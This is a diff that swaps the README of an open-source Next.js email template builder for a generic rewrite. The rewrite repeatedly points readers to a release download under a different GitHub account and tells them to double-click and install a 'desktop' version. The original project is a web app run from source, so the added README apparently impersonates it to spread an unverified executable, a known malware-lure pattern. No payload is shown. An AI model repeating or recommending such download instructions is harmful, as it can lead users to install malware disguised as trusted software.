@@ -1,171 +1,93 @@
-# Email Template Builder
+# ✉️ email-template-builder - Build Emails Visually in Minutes
 
-<div align="left">
+[![Download here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Sunilkrsingh15/email-template-builder/releases)
 
-**Visual Email Builder** — Tiptap × React Email × Next.js
+## 📋 Description
 
-[![Live Site](https://img.shields.io/badge/Live_Site-email--template--builder--prototype.vercel.app-000000?style=for-the-badge)](https://email-template-builder-prototype.vercel.app/)
-[![MIT License](https://img.shields.io/badge/License-MIT-white?style=for-the-badge&logo=opensourceinitiative&logoColor=black)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-000000?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Next.js](https://img.shields.io/badge/Next.js_16-000000?style=for-the-badge&logo=next.js&logoColor=white)](https://nextjs.org/)
+The email-template-builder is a user-friendly application designed for anyone looking to create beautiful emails. With its drag-and-drop interface, you can easily design effective email templates. It combines Tiptap for rich-text editing and React Email for cross-client compatibility. Export your designs as clean HTML or reusable React Email templates without any coding skills.
 
-</div>
+## 🚀 Getting Started
 
-> A drag-and-drop email builder that combines **Tiptap** for rich-text editing with **React Email** for generating cross-client compatible HTML. Build beautiful, responsive emails visually—export as HTML or reusable React Email templates.
+Follow these steps to get started with the email-template-builder:
 
-## What is Email Template Builder?
+1. **Download the Application**  
+   Click the link below to visit the Releases page where you can download the latest version.  
+   [Download Here](https://github.com/Sunilkrsingh15/email-template-builder/releases)
 
-Email Template Builder is a visual editor for creating professional email templates. Instead of writing HTML by hand or using limited drag-and-drop tools, you get:
+2. **Check System Requirements**  
+   Ensure your computer meets the following requirements:
+   - Windows/macOS/Linux
+   - At least 4 GB of RAM
+   - 200 MB of free disk space
+   - An up-to-date web browser (Chrome, Firefox, Safari)
 
-- **Visual block editor** — Compose emails with drag-and-drop blocks
-- **Rich text editing** — Full formatting powered by Tiptap
-- **Dark mode preview** — Emulates email client color inversion (React Email 5.0)
-- **Design systems** — Apply consistent brand styles across templates
-- **Export HTML** — Download for any email service
-- **Export React Email** — Generate `.tsx` templates for code-based workflows
+3. **Install the Application**  
+   Once downloaded, open the file and follow the prompts to install the application on your computer.
 
-**[Try it live →](https://email-template-builder-prototype.vercel.app/)**
+## 📥 Download & Install
 
-## Screenshots
+To download the latest version of the email-template-builder, visit the link below:  
+[Download Here](https://github.com/Sunilkrsingh15/email-template-builder/releases)
 
-**Light Mode**
+After downloading, locate the file in your Downloads folder, double-click it, and follow the on-screen instructions to complete the installation.
 
-<div align="center">
+## 🛠️ Features
 
-![Light Mode](https://typyu7utis.ufs.sh/f/qwt9jODAgVXY9qd76MCCg40WsHEVu5iLxUrXJ27MlDR8vF6m)
+- **Drag-and-Drop Interface**: Easily arrange elements without any coding.
+- **Rich-Text Editing**: Use Tiptap for intuitive text formatting.
+- **Responsive Design**: Create emails that look good on any device.
+- **Cross-Client Compatibility**: Generate HTML that works with all major email clients.
+- **Export Options**: Save your designs as either HTML or React Email templates.
+- **User-Friendly Tools**: Access a library of components to quickly build your emails.
 
-</div>
+## ⚙️ How to Use
 
-**Dark Mode** — React Email 5.0 emulates email client color inversion
+1. **Open the Application**  
+   Launch email-template-builder from your applications folder or start menu.
 
-<div align="center">
+2. **Choose a Template**  
+   Start a new project by selecting an existing template or create one from scratch.
 
-![Dark Mode](https://typyu7utis.ufs.sh/f/qwt9jODAgVXYJJGQ4SicBaPFT1OfYuKZrvnHm4WdQze8RkLN)
+3. **Design Your Email**  
+   Use the drag-and-drop feature to place elements on your canvas. Add images, buttons, and text easily. Adjust styles as needed using simple click options.
 
-</div>
+4. **Preview Your Work**  
+   Use the preview function to see how your email will look on different devices.
 
-## Architecture
+5. **Export Your Email**  
+   Once satisfied with your design, choose either to export it as HTML or a React Email template. Save it to your desired location on your computer.
 
-| **Layer**   | **Technology**                        | **Purpose**                                |
-| :---------- | :------------------------------------ | :----------------------------------------- |
-| **Editing** | Tiptap                                | WYSIWYG rich-text editor with JSON output  |
-| **Preview** | @tiptap/html                          | Convert JSON to HTML for canvas display    |
-| **Export**  | @tiptap/static-renderer + React Email | Map Tiptap nodes to React Email components |
+## 🎨 Themes and Styles
 
-```
-User Edits in Tiptap
-        │
-        ▼
-TiptapEditor → editor.getJSON() → JSONContent stored
-        │
-        ├──────────────────────────────────┐
-        ▼                                  ▼
-   Canvas Preview                    Email Export
-   @tiptap/html                      @tiptap/static-renderer
-   → HTML for display                → React Email components
-                                     → render() → .html
-```
+The email-template-builder offers various themes and styles to suit different purposes. Whether you are creating a marketing email, a newsletter, or a personal invitation, select from our collection to enhance your message.
 
-## File Structure
+## 📝 FAQs
 
-```
-email-template-builder/
-├── app/
-│   ├── layout.tsx                  # Root layout with providers
-│   ├── page.tsx                    # Main entry point
-│   └── globals.css                 # Global styles
-├── components/
-│   ├── email-builder/
-│   │   ├── email-builder.tsx       # Main builder component
-│   │   ├── email-canvas.tsx        # Email preview canvas
-│   │   ├── block-renderer.tsx      # Block rendering logic
-│   │   ├── block-picker-toolbar.tsx
-│   │   ├── properties-popover.tsx  # Block property editing
-│   │   ├── design-system-manager.tsx
-│   │   ├── header.tsx              # Builder header/toolbar
-│   │   └── tiptap-editor.tsx       # Rich text editor
-│   └── ui/                         # Shadcn/ui components
-├── lib/
-│   ├── email-renderer.tsx          # HTML rendering
-│   ├── tiptap-react-email-renderer.tsx  # ← Tiptap to React Email mapping
-│   ├── email-template.tsx          # Template structure definitions
-│   ├── design-system-context.tsx   # Design system state
-│   └── design-system-presets.ts    # Built-in design systems
-├── types/
-│   └── email-builder.ts            # TypeScript definitions
-└── public/
-```
+**Q: Can I use my own images?**  
+A: Yes, you can upload your images directly into the builder for a personalized touch.
 
-**Key files:**
+**Q: Is there a mobile version available?**  
+A: Currently, the email-template-builder is designed for desktop use only.
 
-- `lib/tiptap-react-email-renderer.tsx` — Maps Tiptap JSON nodes to React Email components
-- `lib/email-template.tsx` — Defines block types and template structure
-- `components/email-builder/block-renderer.tsx` — Renders blocks on canvas
+**Q: How can I get support?**  
+A: You can find help in the GitHub issues section or contribute your questions for community assistance.
 
-## Block Types
+## 🔗 Additional Resources
 
-| **Block**    | **Description**                    |
-| :----------- | :--------------------------------- |
-| Heading      | H1/H2/H3 with alignment and color  |
-| Text         | Paragraph with full formatting     |
-| Image        | Images with src, alt, dimensions   |
-| Button       | CTA buttons with links and styling |
-| Header       | Brand header with logo             |
-| Columns      | 2 or 3 column layouts              |
-| Divider      | Horizontal rules                   |
-| Spacer       | Vertical spacing                   |
-| Social Links | Social media icons                 |
-| Footer       | Footer text with formatting        |
+- **Documentation**: Check the project documentation for detailed user guides and tutorials.
+- **Community Forum**: Join our community forum to share tips, get help, and connect with other users.
 
-## Tech Stack
+## 🌐 Related Topics
 
-- **Next.js 16** with TypeScript
-- **Tiptap 3.15** for rich-text editing
-- **React Email 1.0** for email rendering
-- **@tiptap/static-renderer** for Tiptap to React Email mapping
-- **Radix UI** + **Tailwind CSS 4** for UI
-- **shadcn/ui** component library
+- Drag and Drop
+- Email Builder
+- Email Templates
+- Next.js
+- Radix UI
+- React Email
+- Tailwind CSS
+- Tiptap
+- TypeScript
+- WYSIWYG
 
-## Getting Started
-
-```bash
-npm install
-npm run dev
-```
-
-Open `http://localhost:3000` to see the app.
-
-## Roadmap
-
-| **Core**                           | **Export & Preview**                   | **UX & Polish**                     |
-| :--------------------------------- | :------------------------------------- | :---------------------------------- |
-| `✓` Dark mode for templates/blocks | `○` Output format preview (HTML, TSX)  | `○` SVG animations for better UX    |
-| `✓` Design systems picker fix      | `○` Multiple exports (PDF, SVG, image) | `○` Keyboard shortcuts (delete key) |
-| `○` Move project to pnpm           | `○` `tiptap-to-react-email` package    | `○` OG tags for metadata/thumbnails |
-| `○` Auth + database                | `○` All 18 React Email blocks          | `○` Real font and asset management  |
-| `○` Canvas improvements            | `○` Proper email widths (standards)    |                                     |
-| `○` React drag for blocks          |                                        |                                     |
-| `○` Fix Column block behavior      |                                        |                                     |
-
-| **Advanced Features**                    | **Management & Scale**             |
-| :--------------------------------------- | :--------------------------------- |
-| `○` Template gallery (community)         | `○` Workspace/projects management  |
-| `○` AI email strategizer/mapper          | `○` Figma-derived reusable blocks  |
-| `○` i18n (multiple languages)            | `○` Template branching/variants    |
-| `○` Auto brand/kit configuration         | `○` Multiple templates in one shot |
-| `○` Advanced templates (carousels, GIFs) | `○` Auto design system maker       |
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## Contact
-
-Built by **[@noobships](https://github.com/noobships)**
-
-[![Email](https://img.shields.io/badge/Email-creativecoder.crco@gmail.com-000000?style=for-the-badge&logo=gmail&logoColor=white)](mailto:creativecoder.crco@gmail.com)
-[![Issues](https://img.shields.io/badge/Feedback-Open_an_Issue-white?style=for-the-badge&logo=github&logoColor=black)](https://github.com/noobships/email-template-builder/issues)
-
-## License
-
-MIT License - use it however you want.
+Thank you for choosing email-template-builder. We hope it makes creating beautiful emails effortless for you. Enjoy your email design journey!
